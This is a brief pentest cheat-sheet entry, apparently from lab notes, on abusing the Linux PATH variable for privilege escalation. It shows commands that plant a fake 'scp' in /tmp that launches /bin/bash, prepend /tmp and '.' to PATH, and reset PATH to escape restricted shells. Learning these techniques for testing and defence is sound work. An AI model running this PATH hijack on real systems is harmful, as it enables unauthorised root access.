# PATH variable

in PATH environmental variable, its specifies all bin and sbin directories that hold all executable programs are stored. It really useful in some case of priviliage esclation tricks.

## Exported Path

First check if $PATH is exported so we can change it:

```
bob@victimlab:~/#: export -p
...
declare -x ORACLE_HOME="/opt/oracle/instantclient_12_1"
declare -x PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/oracle/instantclient_12_1:/opt/oracle/instantclient_12_1"
...
```
Then, we can set the $PATH to include path to our folder which cotains malicous binary as following:

```
bob@victimlab:~/#: cd /tmp
bob@victimlab:~/#: echo "/bin/bash" > scp
bob@victimlab:~/#: chmod 777 scp
bob@victimlab:~/#: echo $PATH
bob@victimlab:~/#: export PATH=/tmp:$PATH
```

So if program uses the scp command under root it will give us path to priviliage esclation with our malicous binary.

Antoher trick could be use the dot (.) in environment PATH variable so we can execute binaries/scripts from the current directory:

```
root@kali:~/#: export PATH=.:$PATH
```

## Missing binaries

In some restricted shells we may not able use common binaris such as "cd", "sh" etc.
So we'll use export path to load all available binaries:

```
bob@victimlab:~/#: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
```
